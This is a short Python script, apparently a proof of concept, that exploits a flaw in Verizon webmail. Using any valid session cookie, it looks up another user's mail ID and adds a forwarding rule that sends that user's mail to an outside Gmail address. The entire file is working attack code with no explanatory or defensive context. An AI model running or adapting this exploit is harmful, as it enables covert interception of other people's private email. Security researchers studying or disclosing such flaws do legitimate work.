import urllib
import requests
from Cookie import SimpleCookie
 
"""
A valid webmail login is required.
Login to https://mail.verizon.com/ and paste in your Cookie header
"""
cookie_str = '***REMOVED***'
 
 
# Define target and forwarding address
target_username = "***REMOVED***"
forward_address = "***REMOVED***+verizontest@gmail.com"
 
 
def get_cookies(str):
    cookie = SimpleCookie()
    cookie.load(str)
 
    cookies = {}
    for key, morsel in cookie.items():
        cookies[key] = morsel.value
    return cookies
 
 
# Parse cookie string
cookies = get_cookies(cookie_str)
 
# Setup session
s = requests.Session()
s.cookies.update(cookies)
 
# Get target user's mailID
r = s.get("https://mail.verizon.com/webmail/driver?nimlet=mailidlookup&alias={}@verizon.net".format(target_username))
mail_id = r.json().get("res")[0].get("mailID")
 
# Set mail forwarder for target user
params = {
    "target": urllib.quote_plus(mail_id),
    "forward": urllib.quote_plus(forward_address),
}
 
url = "https://mail.verizon.com/webmail/driver?nimlet=ispemailsettings&method=addForward&sourceID=&auth=&auditID=" \
      "&serviceName=MPSMail&userID={target}&forwardAddress={forward}" \
      "&action=AddForward&ts=1460652842592&cmdSeq=1".format(**params)
 
r = s.get(url)
 
print(r.text.strip())